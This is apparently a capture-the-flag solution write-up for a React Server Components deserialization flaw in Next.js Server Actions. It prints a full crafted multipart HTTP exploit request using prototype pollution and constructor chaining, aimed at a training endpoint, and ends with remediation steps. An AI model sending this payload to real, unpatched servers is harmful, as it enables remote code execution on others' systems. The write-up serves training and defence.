# Solution - React2Shell (RSC Deserialization)

See my blog post for detailed explanation.
[Medium](https://medium.com/@snehbavarva/react2shell-cve-2025-55182-practical-exploitation-of-the-vulnerability-2581a65da695)

This challenge demonstrates a **React Server Components (RSC) insecure deserialization issue** reachable through Next.js Server Actions.

The application is intentionally vulnerable and includes a **training-only probe endpoint** that detects and blocks malicious RSC payloads instead of executing them.

---

The vulnerability is introduced by a Server Action (`transferFunds`) that:

* Accepts user-controlled parameters
* Relies on React Server Components for deserialization
* Performs validation **after** React reconstructs the input


## Exploitation

The exploit is delivered as a crafted `multipart/form-data` request shaped like valid RSC Flight data.

Key techniques used:

* Prototype pollution via `__proto__`
* Constructor chaining (`constructor:constructor`)
* Malformed Flight object reconstruction

When sent to the training endpoint, the payload is **detected and blocked**, returning a detailed verdict instead of executing code.

[Normal request Burp image](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*D0yrPOs1Rvo-KlLInfT5_Q.png)

[Exploit request Burp image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_zp8s9XDGJVTebYlAaKkEg.png)

---

### Payload

```http
POST /api/training/rsc-probe HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"TRAINING_ONLY_PAYLOAD","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}

------WebKitFormBoundary--
```

This payload abuses React’s deserialization logic and would lead to code execution in vulnerable, unpatched environments.

---

## Remediation

**Primary fix:** Upgrade React and Next.js to the patched version!

- Validate all Server Action inputs with schemas (e.g., Zod)
- Monitor unusual Server Action requests
- Alert on malformed multipart RSC payloads
- Block prototype pollution patterns at the edge

Refer to the blog post for a full breakdown and recommended patches.

---
